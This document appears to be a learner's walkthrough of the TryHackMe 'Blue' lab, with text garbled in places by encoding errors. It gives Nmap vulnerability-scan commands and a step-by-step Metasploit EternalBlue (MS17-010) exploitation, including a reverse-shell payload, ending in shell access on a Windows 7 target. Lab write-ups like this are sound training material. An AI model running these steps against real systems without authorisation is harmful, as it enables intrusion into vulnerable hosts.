# ğŸ§© BLUE â€” Penetration Test Cookbook

### **Section 1 â€” Initial Scan (Nmap)**

*My notes, my thought process, and what I learned.*

---

## ğŸ”» Task: â€œScan the machine.â€

TryHackMe gives a basic instruction but no question to answer.
This is the first step: enumeration.

---

# ğŸ§  **My Thought Process (Beginner Mindset)**

I know â€œScan the machineâ€ means I need an **Nmap scan**, but I wasnâ€™t sure which type.
My instinct was to use my â€œgeneral all-purpose scanâ€:

```
nmap -sC -sV -p- -oA scan_results <TARGET IP>
```

Why I chose this:

* `-sC` â†’ default scripts
* `-sV` â†’ version detection
* `-p-` â†’ scan all ports
* `-oA` â†’ save output in all formats

This is a **good scan**, but:

* It is **slow**
* It hits **all 65,535 ports**
* In THM networks, packet loss sometimes causes Nmap to â€œhangâ€
* The BLUE room expects you to focus on **vulnerability scripts**, not every port

I saw the scan â€œstallingâ€ (the output repeating open/closed hosts, etc.) and decided to abort and delete the files.

Nothing wrong with this â€” scanning all ports is heavy.

---

# ğŸ§  Why the THM Hint Command Worked Better

TryHackMe suggested:

```
nmap -sV -vv --script vuln <TARGET IP>
```

This command:

* Does **NOT** scan all ports
* Relies on **service detection results**
* Runs **vulnerability scanning scripts**
* Is tailored toward finding *old Windows vulnerabilities*, which is what â€œBLUEâ€ is about

## ğŸ“Œ Why this works well for THIS room:

The BLUE machine is a Windows 7 system vulnerable to **EternalBlue (MS17-010)**.
Nmap has a script that checks for exactly that.

Your scan output confirms:

```
smb-vuln-ms17-010: VULNERABLE
```

This is exactly why the THM hint uses this command â€” it quickly leads beginners to the right vulnerability.

---

# ğŸ§© **My Actual Commands and Screenshots**

## ğŸ”¹ Attempted â€œFull Everything Scanâ€

```
nmap -sC -sV -p- -oA scan_results 10.65.157.216
```

* The scan repeatedly printed â€œSYN Stealth Scan Timingâ€¦â€
* No clear results returned
* I cancelled and deleted the autogenerated files
* This happens when network timing or Nmap retries take too long

ğŸ“· *Screenshot notes:*
You captured the repeated timing lines and the `ls -l` directory listing afterward showing the leftover `.gnmap`, `.nmap`, `.xml`.

---

## ğŸ”¹ Successful THM-Recommended Scan

```
nmap -sV -vv --script vuln 10.65.157.216
```

This produced **useful**, structured results:

* Open ports
* Service versions
* Vulnerabilities discovered
* SMB scripts including MS17-010

### Key findings from your scan:

**Open Ports:**

```
135/tcp â€“ msrpc  
139/tcp â€“ netbios-ssn  
445/tcp â€“ microsoft-ds  
3389/tcp â€“ rdp  
49152-49158/tcp â€“ Windows high RPC port range
```

These ports â†’ classic Windows 7 host.

**Vulnerabilities reported:**

```
smb-vuln-ms17-010: VULNERABLE   <â€” EternalBlue
```

This is the main pivot point for the entire BLUE room.

---

# ğŸ§  What I Learned from This Step

### âœ”ï¸ Lesson 1 â€” Use the right tool for the right job

Scanning all ports is good practice for real-world pentesting,
but in guided labs, the hint scan is often more focused.

### âœ”ï¸ Lesson 2 â€” The `--script vuln` scan is your â€œWindows vulnâ€ shortcut

Especially strong for:

* SMB (445)
* MS08-067
* MS17-010
* RDP vulnerabilities
* Windows RPC exposures

### âœ”ï¸ Lesson 3 â€” Default scripts (`-sC`) â‰  vulnerability scripts

* `-sC` runs *default scan scripts*
* `--script vuln` runs *security vulnerability checks*

### âœ”ï¸ Lesson 4 â€” If Nmap â€œhangsâ€

It's usually:

* packet loss
* full-port scan slowdowns
* retry delays
* network firewalls or throttling

Cancel + switch scan type = valid approach.

---

This section now captures:
âœ” Your attempt
âœ” Your reasoning
âœ” What happened
âœ” Why the hint works
âœ” What to remember next time

---

## ğŸŸ¦ Question: How many ports are open under port number 1000?

### ğŸ§  My Thought Process

The task asked me to determine how many **open ports** existed with **port numbers lower than 1000**.

Since I had already completed enumeration using the command:

```bash
nmap -sV -vv --script vuln <target IP>
````

â€¦I returned to the scan output and reviewed all services marked as **open**, filtering only those whose port numbers were **less than 1000**.

---

### ğŸ” Relevant Output from Nmap

```text
135/tcp   open   msrpc
139/tcp   open   netbios-ssn
445/tcp   open   microsoft-ds
```

Each of these ports falls below the `1000` threshold and is marked in the scan output as **open**.

No other open ports below 1000 were identified.

---

### âœ”ï¸ Final Answer

âœ… **3**


---

## ğŸŸ¦ Question 2: What is this machine vulnerable to?

**Question format required:**  
`ms??-???` (example: ms08-067)

---

### ğŸ§  My Thought Process

After performing the vulnerability scan using:

```bash
nmap -sV -vv --script vuln <target IP>
````

â€¦I reviewed the **Host Script Results** section of the output.
This area contains the results of Nmapâ€™s **SMB vulnerability detection scripts**.

Since the BLUE machine is a Windows host with SMB exposed (`445/tcp`), I focused specifically on **SMB-related findings**.

---

### ğŸ” Relevant Output

```text
smb-vuln-ms17-010:
  VULNERABLE:
  Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
  State: VULNERABLE
  IDs: CVE:CVE-2017-0143
  Risk factor: HIGH
  A critical remote code execution vulnerability exists in Microsoft SMBv1 servers (ms17-010).
```

This script definitively confirms that the target machine is vulnerable to **Microsoft Security Bulletin MS17-010**, the flaw responsible for the **EternalBlue exploit** used by WannaCry and other attacks.

---

### âœ”ï¸ Final Answer

âœ… **ms17-010**

---

## ğŸŸ  Task 2 â€“ Gain Access

### ğŸ§  Objective
Exploit the vulnerable SMB service (MS17-010 / EternalBlue) to gain an initial shell on the target machine.

---

## ğŸŸ¦ Step 1 â€” Start Metasploit

The first instruction is to start the Metasploit Framework.

```bash
msfconsole
````

This launches the exploitation environment we'll use to run our EternalBlue module.

---

## ğŸŸ¦ Step 2 â€” Locate the Exploit Module

Since reconnaissance identified the target as vulnerable to **MS17-010**, my first thought was to search the framework for related modules:

```bash
search ms17-010
```

This produced a list of exploit and auxiliary options. Among them, the most relevant entry was:

```
exploit/windows/smb/ms17_010_eternalblue
```

This module directly targets the EternalBlue vulnerability on **Windows 7 and similar systems**, which aligns with the OS identified in our scan results.

### âœ”ï¸ Answer for TryHackMe: What is the full path of the code? (Ex: exloit/....)

```text
exploit/windows/smb/ms17_010_eternalblue
```

---

## ğŸŸ¦ Step 3 â€” Load the Exploit

I selected the exploit module using the index value from the search listing:

```bash
use 0
```

Confirming that I was now inside the proper exploit module shell:

```text
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

---

## ğŸŸ¦ Step 4 â€” Identify Required Options

To determine what needed configuration, I ran:

```bash
show options
```

Reviewing the output revealed that the required value missing was:

```
RHOSTS
```

This represents the **Remote Host IP address** â€” the target machine for the exploit.

### âœ”ï¸ Answer for TryHackMe: What is the name of thie value? (All caps for submission)

```text
RHOSTS
```

---

## ğŸŸ¦ Step 5 â€” Set the Target IP

I configured the required variable for the exploit:

```bash
set RHOSTS 10.64.184.193
```

Verification:

```bash
show options
```

Confirmed that **RHOSTS** now contained the correct target IP address.

---

## ğŸŸ¦ Step 6 â€” Change Payload Type

TryHackMe required altering the default payload:

```bash
set payload windows/x64/shell/reverse_tcp
```

Originally, the module was configured with:

```text
windows/x64/meterpreter/reverse_tcp
```

### ğŸ§  Payload Clarification

* **Meterpreter payload**

  * Advanced interactive control session
  * Provides built-in post-exploitation commands (hashdump, migrations, screenshots, etc.)

* **Reverse shell payload**

  * Standard Windows command shell
  * Simpler and easier to observe for beginner learning
  * Directly drops you into `cmd.exe`

This lab requires the reverse shell for educational purposes so the connection behavior and DOS shell access are more visible.

**Without changing the payload**, the exploit still would have succeeded â€” but we would have received a **meterpreter shell instead of a raw command shell**, skipping some of the command-line interaction the room wants to demonstrate.

---

## ğŸŸ¦ Step 7 â€” Execute the Exploit

Once configuration was complete, I launched exploitation:

```bash
exploit
```

*(Equivalent command: `run`)*

---

## ğŸŸ¢ Exploitation Output Highlights

Key events seen in terminal:

* Connection established to target
* OS verified: Windows 7 SP1 x64
* SMB pool grooming performed
* EternalBlue exploit fragments delivered
* Exploit reported **WIN**
* Shell session opened

---

## ğŸŸ¢ Shell Access Achieved

MSF confirmed return access with the shell banner:

```text
Microsoft Windows [Version 6.1.7601]
```

Followed by an interactive Windows DOS shell:

```text
C:\Windows\system32>
```

This confirms **successful initial compromise** of the target system.

---

## ğŸ§· Step 8 â€” Background the Shell

Per task instructions, I backgrounded the session:

```bash
CTRL + Z
```

When prompted:

```text
Background session 1? [y/n]
```

I selected:

```text
y
```

This returned me to the Metasploit module prompt:

```text
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

The shell remains active but is now running in the background for post-exploitation tasks.

---

## âœ… TASK 2 â€“ GAIN ACCESS: COMPLETE

### Achievements

âœ… Identified correct exploit module
âœ… Configured required target parameters
âœ… Selected educational payload
âœ… Successfully executed EternalBlue exploit
âœ… Achieved command-line shell access
âœ… Maintained control of session via Metasploit backgrounding

---

